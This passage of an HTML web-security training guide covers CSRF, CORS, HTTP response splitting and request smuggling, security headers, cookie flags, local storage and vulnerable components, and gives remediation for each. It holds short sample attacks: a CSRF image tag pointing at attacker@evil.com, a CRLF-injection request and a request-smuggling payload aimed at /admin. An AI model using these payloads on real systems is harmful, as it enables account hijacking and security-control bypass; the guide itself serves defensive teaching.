                    <img src="Images/CSRF-1.png" width="100%" height="auto">
                    <p>3. Browser automatically sends the session cookie to example.com.</p>
                    <p>4. Victim‚Äôs email is changed without their knowledge.</p>                    
                    <b>Scenario 2 ‚Äî CSRF using POST request</b>
                    <p>1. Attacker creates a hidden form:</p>
                    <img src="Images/CSRF-2.png"width="100%" height="auto">
                    <p>2. When a logged-in user visits the page, the form submits automatically.</p>
                    <p>3. The bank transfers money to the attacker‚Äôs account.</p>
                </div>

                <div class="remediation-box">
                    <h3>üõ† Remediation (How to Prevent CSRF)</h3>
                    <b>1. Use Anti-CSRF Tokens</b>
                    <p>Include a unique token in forms or AJAX requests, tied to the user session.</p>
                    <p>Server validates token before processing the request.</p>
                    <p>Example (HTML form):</p>
                    <img src="Images/CSRF-3.png" width="100%" height="auto">
                    <p>JavaScript context: use JS string escaping or avoid embedding untrusted data into script blocks.</p>
                    <p>URL context: percent-encode.</p>
                    <p><b>2. Use SameSite Cookies</b>Set cookies with SameSite=Lax or SameSite=Strict to prevent them from being sent in cross-site requests.</p>
                    <p><b>3. Verify Origin/Referer Header</b> Ensure requests come from your own domain before processing sensitive actions.</p>
                    <p><b>4. Use Framework Protection</b> Most modern frameworks (Django, Rails, Laravel, Spring) have built-in CSRF protection.</p>
                    <p><b>5. Avoid GET for state-changing actions</b> Only use POST, PUT, DELETE for actions that modify data.</p>
                </div>
                                
                <h3>üìö Reference Links:</h3>
                <p><a href="https://owasp.org/www-community/attacks/csrf">https://owasp.org/www-community/attacks/csrf</a></p>
                <p><a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html</a></p>
                <p><a href="https://developer.mozilla.org/en-US/docs/Glossary/CSRF">https://developer.mozilla.org/en-US/docs/Glossary/CSRF</a></p>
                <p><a href="https://portswigger.net/web-security/csrf">https://portswigger.net/web-security/csrf</a></p>
            </div>
        </div>

        <!-- Topic 20: Cross-Origin Resource Sharing -->
            <div id="cross-origin-resource-sharing" class="topic-card">
                <div class="topic-header">
                    <div class="topic-icon">
                        <i class="fas fa-file-upload"></i>
                    </div>
                    <h2>20. Cross-Origin Resource Sharing</h2>
                </div>
                
                <h3>üß© CORS (Cross-Origin Resource Sharing):</h3>
                <p>CORS (Cross-Origin Resource Sharing) is a browser security mechanism that controls whether a web page running on one origin (domain) can make requests to another origin and read the responses.</p>
                <p><b>Same-Origin Policy (SOP):</b> by default, scripts can only access responses from the same origin.</p>
                <p><b>CORS:</b> allows servers to relax SOP by specifying which origins are allowed to access their resources.</p>
                <p><b>Important:</b> CORS is enforced by browsers only, not by the server. A misconfigured CORS policy can let attackers read sensitive data from your site.</p>
                
                <div class="example-box">
                    <h3>Examples</h3>
                    <p>You are logged into your bank. Visiting a malicious site could make your browser unknowingly send a money transfer request to your bank.</p>

                <div class="warning-box">
                    <h3>üí• Impact of the Issue</h3>
                    <p><b>Steal sensitive data</b> from APIs (user info, emails, tokens).</p>
                    <p><b>Hijack accounts</b> if authentication cookies are sent automatically.</p>
                    <p><b>Perform unauthorized actions</b> by tricking logged-in users.</p>
                    <p><b>Exfiltrate CSRF tokens or session info</b>, enabling further attacks.</p>
                </div>
                <p>Severity depends on what the API returns and whether credentials (cookies, tokens) are involved.</p>
                
                <div class="attack-scenario-box">
                    <h3>üß™ Attack Scenarios & Examples</h3>
                    <b>Scenario 1 ‚Äî Malicious site steals data</b>
                    <p>1. Victim is logged in to api.example.com.</p>
                    <p>2. Victim visits attacker.com</p>
                    <p>3. Attacker‚Äôs JS sends:</p>
                    <!-- <img src="https://example.com/change-email?email=attacker@evil.com" /> -->
                    <img src="Images/CORS-1.png" width="100%" height="auto">
                    <p>If api.example.com allows the attacker‚Äôs origin via CORS, the browser sends the cookie and attacker reads the response.</p>                    
                    <b>Scenario 2 ‚Äî Origin reflection</b>
                    <p>Server responds:</p>
<pre>
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
</pre>
                    <p>Any attacker origin can bypass SOP and access sensitive data.</p>
                </div>

                <div class="remediation-box">
                    <h3>üõ† Remediation (How to fix CORS issues)</h3>
                    <b>1. Use strict origin whitelist</b>
                    <p>Only allow trusted origins, e.g., https://app.example.com.</p>
                    <b>2. Handle credentials safely</b>
                    <p>If Access-Control-Allow-Credentials: true, never use * for origin.</p>
                    <p>Prefer token-based auth over cookies where possible.</p>
                    <b>3. Always validate authorization server-side</b>
                    <p>Do not rely on CORS to protect sensitive endpoints.</p>
                    <b>4. Limit methods & headers</b>
                    <p>Only allow required HTTP methods (GET, POST) and headers.</p>
                    <b>5. Use Vary: Origin</b>
                    <p>Ensures caches do not serve wrong ACAO headers.</p>
                    <b>6. Secure cookies</b>
                    <p>Use HttpOnly, Secure, and SameSite flags to reduce risk.</p>
                </div>
                <h3>‚úÖ Example of Safe CORS (Node.js Express)</h3>
                <img src="Images/CORS-2.png" width="100%" height="auto">
                <h3>üìö Reference Links:</h3>
                <p><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CORS">https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CORS</a></p>
                <p><a href="https://owasp.org/www-project-secure-headers/#access-control-allow-origin">https://owasp.org/www-project-secure-headers/#access-control-allow-origin</a></p>
                <p><a href="https://portswigger.net/web-security/cors">https://portswigger.net/web-security/cors</a></p>
            </div>
        </div>

           <!-- Topic 21: HTTP Splitting and Smuggling -->
            <div id="http-splitting-and-smuggling" class="topic-card">
                <div class="topic-header">
                    <div class="topic-icon">
                        <i class="fas fa-file-upload"></i>
                    </div>
                    <h2>21. HTTP Splitting and Smuggling</h2>
                </div>
                
                <h3>üåê HTTP Splitting:</h3>
                <p>HTTP Splitting and Smuggling vulnerabilities occur when attackers manipulate how web servers, proxies, or load balancers interpret HTTP requests. This can let them inject extra responses, bypass security controls, poison caches, or hijack user sessions. The fix is strict input validation, consistent parsing across components, and secure HTTP header handling.</p>
                <p><b>Definition:</b> HTTP Response Splitting happens when an attacker injects CRLF characters (\r\n) into HTTP headers.</p>
                <p><b>Effect:</b> This ‚Äúsplits‚Äù one response into two, allowing attackers to inject malicious headers or content.</p>
                <b>Example:</b>
<pre>
GET /page?lang=en%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1 200 OK
</pre>
                <p>This tricks the server into sending two responses, enabling cache poisoning or XSS.</p>
                <h3>üåê HTTP Smuggling:</h3>
                <p><b>Definition:</b> HTTP Request Smuggling exploits inconsistent parsing of HTTP requests between front-end (proxy/load balancer) and back-end servers.</p>
                <p><b>Effect:</b> Attackers craft requests that are interpreted differently by each server, letting them smuggle hidden requests.</p>
                <b>Example:</b>
<pre>
POST / HTTP/1.1
Host: victim.com
Content-Length: 13
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: victim.com
</pre>
                <p>The proxy may see one request, while the back-end sees two, allowing attackers to bypass controls.</p>

                <div class="example-box">
                    <h3>Examples</h3>
                    <p>You are logged into your bank. Visiting a malicious site could make your browser unknowingly send a money transfer request to your bank.</p>

                <div class="warning-box">
                    <h3>üí• Impact of the Issue</h3>
                    <p><b>Cache Poisoning:</b> Attackers inject malicious responses into shared caches.</p>
                    <p><b>Session Hijacking:</b> Smuggled requests can steal cookies or tokens.</p>
                    <p><b>Bypass Security Controls:</b> WAFs or proxies may miss hidden requests.</p>
                    <p><b>Cross-Site Scripting (XSS):</b> Injected headers or responses can execute malicious scripts.</p>
                    <p><b>Data Theft & Privilege Escalation:</b> Attackers gain unauthorized access to sensitive endpoints.</p>
                </div>
                
                <div class="attack-scenario-box">
                    <h3>üé≠ Attacker Scenarios & Examples</h3>
                    <p><b>Cache Poisoning Attack:</b> Attacker injects malicious JavaScript into a cached response, served to all users.</p>
                    <p><b>Hidden Admin Access:</b> Smuggled request bypasses authentication checks and reaches /admin.</p>
                    <p><b>Session Fixation:</b> Injected headers force a victim to use a known session ID.</p>
                    <p><b>Real-World Example:</b> In 2019, multiple CDNs and load balancers were found vulnerable to HTTP request smuggling, allowing attackers to hijack sessions and poison caches.</p>
                </div>

                <div class="remediation-box">
                    <h3>üõ† Remediation Strategies</h3>
                    <p><b>Input Validation:</b> Sanitize user input to block CRLF injection.</p>
                    <p><b>Consistent Parsing:</b> Ensure all servers (proxy, load balancer, back-end) use the same HTTP parsing rules.</p>
                    <p><b>Disable Ambiguous Headers:</b> Avoid using both Content-Length and Transfer-Encoding together.</p>
                    <p><b>Patch & Update:</b> Keep web servers, proxies, and frameworks updated.</p>
                    <p><b>Security Testing:</b> Use penetration testing tools to detect splitting/smuggling flaws.</p>
                    <p><b>WAF Rules:</b> Deploy rules to block suspicious HTTP header manipulations.</p>
                </div>

                <h3>üìö Reference Links:</h3>
                <p><a href="https://portswigger.net/web-security/request-smuggling">https://portswigger.net/web-security/request-smuggling</a></p>
                <p><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/15-Testing_for_HTTP_Splitting_Smuggling">https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/15-Testing_for_HTTP_Splitting_Smuggling</a></p>
                <p><a href="https://github.com/OWASP/www-project-web-security-testing-guide/blob/master/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/15-Testing_for_HTTP_Splitting_Smuggling.md">https://github.com/OWASP/www-project-web-security-testing-guide/blob/master/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/15-Testing_for_HTTP_Splitting_Smuggling.md</a></p>
            </div>
        </div>

    <!-- Topic 22: Security Headers -->
            <div id="security-headers" class="topic-card">
                <div class="topic-header">
                    <div class="topic-icon">
                        <i class="fas fa-heading"></i>
                    </div>
                    <h2>22. Security Headers</h2>
                </div>
                
                <h3>üìåContent Security Policy (CSP):</h3><p>It is a security feature that helps prevent Cross-Site Scripting (XSS), clickjacking, and other code injection attacks by controlling which resources (scripts, styles, images, etc.) the browser is allowed to load and execute.</p>
                <p>It is implemented using the Content-Security-Policy HTTP response header.</p>
                
                <div class="info-box">
                    <h3>‚úÖ What is the Use of CSP?</h3>
                    <p>The main purposes of CSP include:</p>
                    <p>1. Prevent XSS attacks by blocking inline scripts or scripts from untrusted sources.</p>
                    <p>2. Restrict resource loading (e.g., only allow scripts from your domain or trusted CDNs).</p>
                    <p>3. Reduce attack surface by allowing developers to whitelist only necessary resources.</p>
                </div>
                
                <div class="warning-box">
                    <h3>‚ö†Ô∏è Impact if CSP is Not Implemented?</h3>
                    <p>Without CSP:</p>
                    <p>Your app is vulnerable to XSS attacks, where malicious scripts can run in the browser.</p>
                    <p>Attackers may steal cookies, session tokens, or impersonate users.</p>
                    <p>May allow injection of unauthorized third-party content, like malicious ads or trackers.</p>
                    <p>Increases the risk of data leakage or phishing via trusted UI.</p>
                </div>
                
                <div class="remediation-box">
                    <h3>üõ†Ô∏è Remediation</h3>
                    <p>1. Implement a strong CSP policy.</p>
                    <p>2. Avoid inline JavaScript and use external scripts with nonce or hash.</p>
                    <p>3. Remove unsafe directives like unsafe-inline, unsafe-eval.</p>
                    <p>4. Use CSP reporting to monitor violations via report-Uri or report-to.</p>
                </div>
                
                <h3>üß† React Best Practices for CSP</h3>
                <p>Avoid inline styles/scripts ‚Äì use external files.</p>
                <p>Use dangerouslySetInnerHTML sparingly ‚Äì it can break CSP and invite XSS.</p>
                <p>Use React Helmet to help manage meta tags, but remember headers are best set server-side.</p>
                
                <h3>üß™ Testing and Validation</h3>
                <p>Use browser dev tools ‚Üí Console ‚Üí CSP errors.</p>
                <p>Use Google CSP Evaluator: https://csp-evaluator.withgoogle.com/</p>
                <p>Use report-uri or report-to to log violations.</p>
                
                <!-- X-Frame-Options section -->
                <h3>üõ°Ô∏è What is X-Frame-Options?</h3>
                <p>X-Frame-Options is an HTTP response header that prevents your website from being embedded in an "iframe" on other domains. This protects against clickjacking attacks.</p>
                
                <h3>‚úÖ What Is the Use of It?</h3>
                <p>Clickjacking occurs when a malicious website embeds your site in an invisible "iframe" and tricks users into clicking buttons or links without knowing. This can lead to:</p>
                <p>Unintended actions (e.g. transferring funds, deleting content)</p>
                <p>Credential theft</p>
                <p>UI redressing</p>
                <p>X-Frame-Options blocks this by controlling how/if your site can be framed.</p>
                
                <div class="warning-box">
                    <h3>‚ö†Ô∏è What is the Impact If the Header Is Missing?</h3>
                    <p>Without X-Frame-Options, your app is vulnerable to:</p>
                    <p>Clickjacking attacks</p>
                    <p>UI redressing threats</p>
                    <p>Trust erosion ‚Äî users might unknowingly interact with malicious overlays</p>
                    <p>Regulatory non-compliance (e.g. OWASP Top 10: A5 ‚Äì Security Misconfiguration)</p>
                </div>
                
                <div class="remediation-box">
                    <h3>üõ†Ô∏è Remediation of the Issue</h3>
                    <p>Set the X-Frame-Options header to DENY or SAMEORIGIN.</p>
                    <p>Use Content-Security-Policy (CSP) with the frame-ancestors directive for more modern control (CSP is more flexible and the preferred long-term solution).</p>
                    <p>Avoid using "iframe" to load sensitive interfaces unless absolutely necessary.</p>
                </div>
                
                <h3>üîó Reference Links:</h3>
                <p><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/X-Frame-Options">https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/X-Frame-Options</a></p>
                <p><a href="https://owasp.org/www-community/attacks/Clickjacking">https://owasp.org/www-community/attacks/Clickjacking</a></p>
                <p><a href="https://helmetjs.github.io/docs/frameguard/">https://helmetjs.github.io/docs/frameguard/</a></p>

                <!-- X-Content-Type-Options section -->
                <h3>üõ°Ô∏è What is X-Content-Type-Options?</h3>
                <p>X-Content-Type-Options is an HTTP security header that prevents browsers from MIME-sniffing a response away from the declared content-type.</p>
                <p>It is used to force the browser to respect the Content-Type declared by the server, thus preventing it from interpreting files as something else.</p>
                
                <h3>‚úÖ What Is the Use of It?</h3>
                <p>Helps prevent MIME type confusion attacks where a browser tries to "guess" the type of a file and executes it as something else (e.g., executing a script when it should be treated as plain text).</p>
                <p>Protects against cross-site scripting (XSS) and drive-by downloads by ensuring that content is interpreted strictly as the intended type.</p>
                <p>Improves overall content security by eliminating ambiguity on how resources are handled.</p>
                
                <div class="warning-box">
                    <h3>‚ö†Ô∏è Impact if the Application Does NOT Implement this Header</h3>
                    <p>Browsers may mime-sniff responses and treat non-executable resources as executable, opening up your app to XSS.</p>
                    <p>Attackers can exploit this to run malicious scripts or load unsafe content.</p>
                    <p>Potential security vulnerabilities in older browsers or those that support content sniffing.</p>
                    <p>Increased risk of client-side injection attacks.</p>
                </div>
                
                <div class="remediation-box">
                    <h3>üõ†Ô∏è Remediation of the Issue</h3>
                    <p>Add the header:</p>
                    <pre><code>X-Content-Type-Options: nosniff</code></pre>
                    <p>Ensure your server is sending correct Content-Type headers for all resources.</p>
                    <p>Avoid serving files with ambiguous or incorrect MIME types.</p>  
                    <p>Use security middleware or server configuration to automate this header.</p>
                </div>
                
                <h3>üîó Reference Links:</h3>
                <p><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/X-Content-Type-Options">https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/X-Content-Type-Options</a></p>
                <p><a href="https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html#x-content-type-options">https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html#x-content-type-options</a></p>
                <p><a href="https://helmetjs.github.io/">https://helmetjs.github.io/</a></p>

                <!-- Strict-Transport-Security section -->
                <h3>üõ°Ô∏è What is Strict-Transport-Security?</h3>
                <p>The Strict-Transport-Security (HSTS) header is an HTTP response header that enforces browsers to only interact with your website over HTTPS (secure connection).</p>
                <p>It tells browsers to automatically convert all HTTP requests to HTTPS for a specified time, preventing insecure HTTP access.</p>
                
                <h3>‚úÖ What Is the Use of It?</h3>
                <p>Prevents <b>SSL/TLS stripping attacks</b> where attackers downgrade HTTPS to HTTP and intercept traffic.</p>
                <p>Ensures <b>all communications are encrypted</b>, protecting data integrity and confidentiality.</p>
                <p>Improves overall <b>website security</b> by forcing HTTPS usage on clients.</p>
                <p>Helps browsers <b>remember your site is HTTPS only</b> (even if users type http://).</p>
                
                <div class="warning-box">
                    <h3>‚ö†Ô∏è Impact if the Application Does NOT Implement this Header</h3>
                    <p>Users might access the site over <b>unencrypted HTTP</b>, exposing data to interception or manipulation.</p>
                    <p>Vulnerable to <b>man-in-the-middle (MITM)</b> attacks where attackers downgrade connections.</p>
                    <p>Users can be redirected to unsafe versions of your site without knowing.</p>
                    <p>Loss of user trust and potential regulatory compliance issues.</p>
                </div>
                
                <div class="remediation-box">
                    <h3>üõ†Ô∏è Remediation of the Issue</h3>
                    <p>Add the Strict-Transport-Security header with recommended parameters:</p>
                    <p>Strict-Transport-Security: max-age=31536000; includeSubDomains; preload</p>
                    <p>max-age=31536000 ‚Äî enforce HTTPS for 1 year (in seconds).</p>
                    <p>includeSubDomains ‚Äî apply rule to all subdomains.</p>
                    <p>preload ‚Äî optional, for inclusion in browser preload lists (submit at https://hstspreload.org/).</p>
                </div>
                
                <h3>üîó Reference Links:</h3>
                <p><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Strict-Transport-Security">https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Strict-Transport-Security</a></p>
                <p><a href="https://owasp.org/www-project-secure-headers/#strict-transport-security">https://owasp.org/www-project-secure-headers/#strict-transport-security</a></p>
                <p><a href="https://helmetjs.github.io/docs/hsts/">https://helmetjs.github.io/docs/hsts/</a></p>
                
                <!-- Cache-Control section -->
                <h3>üõ°Ô∏è What is Cache-Control?</h3>
                <p>Cache-Control is an HTTP header used to specify caching policies for browsers and intermediate caches (like proxies or CDNs). It controls how, and for how long, responses are cached to improve performance and reduce server load.</p>
                
                <h3>‚úÖ What Is the Use of It?</h3>
                <p>Controls whether responses can be cached, by whom, and for how long.</p>
                <p>Helps improve page load speed by reusing cached content.</p>
                <p>Ensures clients get fresh or stale content based on your policy.</p>
                <p>Manages cache validation and revalidation.</p>
                <p>Controls privacy by preventing sensitive data caching.</p>
                
                <div class="warning-box">
                    <h3>‚ö†Ô∏è Impact if the Application Does NOT Implement this Header</h3>
                    <p>Browsers and proxies might cache sensitive data improperly, risking data leaks.</p>
                    <p>Stale or outdated content may be served to users, causing confusion or errors.</p>
                    <p>Increased load on your backend servers due to unnecessary repeated requests.</p>
                    <p>Potential security risks, especially if private data is cached publicly.</p>
                    <p>Lack of caching may result in poor performance and slower page loads.</p>
                </div>
                
                <div class="remediation-box">
                    <h3>üõ†Ô∏è Remediation of the Issue</h3>
                    <p>Set appropriate Cache-Control headers on the server or CDN.</p>
                    <p>Use long max-age values for static assets with cache busting (e.g., hashed filenames).</p>
                    <p>Use no-cache or no-store for sensitive or dynamic data.</p>
                    <p>Regularly review caching policies to match app requirements.</p>
                </div>
                
                <h3>üîó Reference Links:</h3>
                <p><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Cache-Control">https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Cache-Control</a></p>
                <p><a href="https://nginx.org/en/docs/http/ngx_http_headers_module.html#add_header">https://nginx.org/en/docs/http/ngx_http_headers_module.html#add_header</a></p>
            </div>



    <!-- Topic 23: Secure Cookies -->
            <div id="secure-cookies" class="topic-card">
                <div class="topic-header">
                    <div class="topic-icon">
                        <i class="fas fa-cookie"></i>
                    </div>
                    <h2>23. Implement Secure, HTTPOnly & SameSite flags on Session Cookies</h2>
                </div>
                
                <h3>üìå What is the Secure Flag?</h3>
                <p>The Secure flag is a cookie attribute that instructs browsers to only send the cookie over HTTPS connections. When this flag is set, the cookie is never transmitted over unencrypted HTTP, protecting it from being intercepted by attackers in man-in-the-middle (MITM) attacks.</p>
                
                <h3>‚úÖ How is the Secure Flag Used?</h3>
                <p>The Secure flag is set by the server when creating cookies, especially session cookies that identify authenticated users.</p>
                <p>Example HTTP response header:</p>
                <p><b>Set-Cookie: sessionId=abc123; Secure; HttpOnly; SameSite=Strict</b></p>
                <p>Secure means the browser will only send this cookie on HTTPS requests.</p>
                <p>It helps protect cookies from exposure on insecure networks.</p>
                
                <div class="warning-box">
                    <h3>‚ö†Ô∏è Impact if the Secure flag is not implemented on session cookies</h3>
                    <p>1. Cookie theft via MITM attacks: On unsecured HTTP connections, attackers can sniff cookies and hijack user sessions.</p>
                    <p>2. Session hijacking: Attackers can impersonate legitimate users, leading to account compromise.</p>
                    <p>3. Loss of confidentiality and integrity: Sensitive data in cookies can be intercepted and manipulated.</p>
                    <p>4. Non-compliance: Failing to set Secure on session cookies may violate security best practices and regulations.</p>
                </div>
                
                <div class="remediation-box">
                    <h3>üõ†Ô∏è Remediation of the Issue</h3>
                    <p>Always set the Secure flag on cookies that contain sensitive data, especially session cookies.</p>
                    <p>Ensure your website uses HTTPS exclusively to benefit from the Secure flag.</p>
                    <p>Combine Secure with HttpOnly (prevents client-side scripts from accessing cookies) and SameSite attributes to further harden cookie security.</p>
                    <p>Review cookie handling in your backend and frontend to confirm the Secure flag is applied.</p>
                </div>
                
                <h3>üîó Reference Links:</h3>
                <p><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/Cookies#restrict_access_to_cookies">https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/Cookies#restrict_access_to_cookies</a></p>
                <p><a href="https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html#use-the-secure-flag">https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html#use-the-secure-flag</a></p>
                <p><a href="https://owasp.org/www-community/controls/SecureFlag">https://owasp.org/www-community/controls/SecureFlag</a></p>
                <p><a href="https://expressjs.com/en/api.html#res.cookie">https://expressjs.com/en/api.html#res.cookie</a></p>

                <!-- HTTPOnly Flag section -->
                <h3>üìå What is the HTTPOnly Flag?</h3>
                <p>The HTTPOnly flag is a cookie attribute that prevents client-side scripts (like JavaScript) from accessing the cookie. This helps protect cookies‚Äîespecially session cookies‚Äîfrom cross-site scripting (XSS) attacks where malicious scripts try to steal cookies.</p>
                
                <h3>‚úÖ How is the HTTPOnly flag used?</h3>
                <p>When a server sets a cookie, it can add the HttpOnly attribute in the Set-Cookie header:</p>
                <p><b>Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict</b></p>
                <p>This tells browsers not to expose the cookie to client-side APIs such as document.cookie.</p>
                <p>The cookie is still sent with every HTTP request to the server but is invisible to JavaScript.</p>
                
                <div class="warning-box">
                    <h3>‚ö†Ô∏è Impact if the HTTPOnly flag is not implemented on session cookies</h3>
                    <p>1. XSS attacks become more dangerous: Malicious JavaScript can read the cookie and send it to attackers.</p>
                    <p>2. Session hijacking: Attackers can steal session cookies and impersonate users.</p>
                    <p>3. Increased risk of account compromise: Without protection, session cookies are vulnerable.</p>
                    <p>4. Violation of security best practices: Leaving out this flag weakens cookie security posture.</p>
                </div>
                
                <div class="remediation-box">
                    <h3>üõ†Ô∏è Remediation of the Issue</h3>
                    <p>Always set the HttpOnly flag on cookies containing sensitive information, especially session cookies.</p>
                    <p>Combine with Secure and SameSite flags for better security.</p>
                    <p>Fix any XSS vulnerabilities in your application to reduce overall risk.</p>
                    <p>Set cookie flags on the server side when issuing cookies.</p>
                </div>
                
                <h3>üîó Reference Links:</h3>
                <p><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/Cookies#restrict_access_to_cookies">https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/Cookies#restrict_access_to_cookies</a></p>
                <p><a href="https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html#use-the-httponly-flag">https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html#use-the-httponly-flag</a></p>
                <p><a href="https://owasp.org/www-community/attacks/xss/">https://owasp.org/www-community/attacks/xss/</a></p>

                <!-- SameSite Flag section -->
                <h3>üîê What is the SameSite Flag?</h3>
                <p>The SameSite flag is a security feature that tells your browser when to include cookies in requests made from other websites. By restricting cross-site cookie transmission, it protects your application from CSRF attacks and reduces the risk of sensitive data leakage to third-party sites.</p>
                
                <div class="warning-box">
                    <h3>‚ö†Ô∏è Impact if SameSite is NOT Implemented</h3>
                    <p>If the SameSite flag is missing or incorrectly configured:</p>
                    <p>1. The application becomes vulnerable to CSRF attacks, where attackers can trick users into performing unintended actions (like changing passwords, making purchases, etc.).</p>
                    <p>2. Cookies (especially session tokens) may be exposed in cross-site requests.</p>
                    <p>3. Reduces compliance with modern browser security requirements ‚Äî Chrome and others now apply SameSite=Lax by default if unspecified.</p>
                </div>
                
                <div class="remediation-box">
                    <h3>üõ†Ô∏è Remediation of the Issue</h3>
                    <p>Set the SameSite flag explicitly for all cookies ‚Äî particularly authentication and session cookies.</p>
                    <pre><code>Set-Cookie: sessionId=abc123; Secure; HttpOnly; SameSite=Strict</code></pre>
                    <p>Ensures cookies are only sent over HTTPS (Secure)</p>
                    <p>Prevents access from JavaScript (HttpOnly)</p>
                    <p>Blocks cross-site requests (SameSite=Strict)</p>
                </div>
            </div>

            <!-- Topic 24: Local Storage Security -->
            <div id="local-storage" class="topic-card">
                <div class="topic-header">
                    <div class="topic-icon">
                        <i class="fas fa-database"></i>
                    </div>
                    <h2>24. Sensitive Information in Local Storage</h2>
                </div>
                
                <h3>üìå What Happens When an Application Stores Sensitive Information in Local Storage?</h3>
                <p>Local storage is a web storage mechanism that allows websites to store data in the user's browser. It's accessible through JavaScript and persists even after the browser is closed.</p>
                <p>When sensitive data (like authentication tokens, passwords, personal user data, or payment info) is stored here, it becomes vulnerable because:</p>
                <p><b>Accessible by any JavaScript running on the page:</b> This means if an attacker manages to inject malicious JavaScript (e.g., via XSS), they can easily access local storage data.</p>
                <p><b>No expiration mechanism:</b> Data stays until explicitly deleted, increasing the risk if the device is shared or compromised.</p>
                <p><b>No encryption:</b> Data is stored as plain text, so anyone with access to the device/browser profile can read it.</p>
                
                <div class="warning-box">
                    <h3>‚ö†Ô∏è Impact of Storing Sensitive Information in Local Storage</h3>
                    <p><b>Cross-Site Scripting (XSS) attacks:</b> If your site is vulnerable to XSS, an attacker can steal tokens or sensitive info from local storage.</p>
                    <p><b>Data theft on shared or stolen devices:</b> Anyone with access to the device/browser profile can retrieve the sensitive data.</p>
                    <p><b>Session hijacking:</b> Stolen tokens or credentials can allow attackers to impersonate the user.</p>
                    <p><b>Non-compliance:</b> Violates security best practices and compliance standards (like GDPR, PCI DSS, HIPAA).</p>
                </div>
                
                <div class="remediation-box">
                    <h3>üõ†Ô∏è Remediation of the Issue</h3>
                    <p>1. Avoid storing sensitive data in local storage entirely.</p>
                    <p>2. Use secure, httpOnly cookies for sensitive tokens:</p>
                    <p>Cookies marked as HttpOnly are inaccessible via JavaScript, preventing access from XSS attacks.</p>
                    <p>Use the Secure flag to ensure cookies are sent only over HTTPS.</p>
                    <p>Use the SameSite attribute to prevent CSRF attacks.</p>
                    <p>3. Implement strong Content Security Policy (CSP): Mitigates XSS by restricting the sources of executable scripts.</p>
                    <p>4. Use proper authentication mechanisms: Use short-lived access tokens with refresh tokens stored securely.</p>
                    <p>5. Encrypt sensitive data if it must be stored client-side: But preferably avoid this approach.</p>
                    <p>6. Clear sensitive data from storage on logout or session expiration.</p>
                </div>
                
                <h3>üîó Reference Links:</h3>
                <p><a href="https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html#local-storage">https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html#local-storage</a></p>
                <p><a href="https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html#session-management">https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html#session-management</a></p>
                <p><a href="https://developer.mozilla.org/en-US/docs/Web/API/Web_Storage_API">https://developer.mozilla.org/en-US/docs/Web/API/Web_Storage_API</a></p>
            </div>  

            <!-- Topic 25: Vulnerable Components -->
            <div id="vulnerable-components" class="topic-card">
                <div class="topic-header">
                    <div class="topic-icon">
                        <i class="fas fa-cubes"></i>
                    </div>
                    <h2>25. Components with Known Vulnerabilities</h2>
                </div>
                
                <h3>üìå What Happens When the Application Uses Components with Known Vulnerabilities?</h3>
                <p>When an application relies on third-party libraries, frameworks, or components that have known security vulnerabilities, it exposes itself to various risks. These vulnerabilities could be due to bugs, design flaws, or security weaknesses that have already been discovered and documented publicly.</p>
                <p>Using such vulnerable components means:</p>
                <p>Attackers can exploit these known flaws to compromise the application.</p>
                <p>The application inherits the security weaknesses of its dependencies.</p>
                <p>It increases the risk of data breaches, unauthorized access, or application malfunction.</p>
                
                <div class="warning-box">
                    <h3>‚ö†Ô∏è Impact of Using Components with Known Vulnerabilities</h3>
                    <p><b>Data compromise:</b> Sensitive information may be leaked or stolen.</p>
                    <p><b>Remote code execution:</b> Vulnerabilities can allow attackers to run arbitrary code.</p>
                    <p><b>Denial of service:</b> Exploiting vulnerabilities to crash or slow down the application.</p>
                    <p><b>Privilege escalation:</b> Attackers gain unauthorized privileges.</p>
                    <p><b>Loss of trust & reputation:</b> Users lose confidence in the app's security.</p>
                    <p><b>Non-compliance:</b> Failure to meet security standards and regulations.</p>
                    <p><b>Chain reaction:</b> Vulnerabilities in dependencies can propagate through your supply chain.</p>
                </div>
                
                <div class="remediation-box">
                    <h3>üõ†Ô∏è Remediation of the Issue</h3>
                    <p><b>1. Regularly scan and monitor dependencies:</b></p>
                    <p>Use automated tools like Dependabot, Snyk, npm audit, OSS Index, or WhiteSource to detect vulnerable packages.</p>
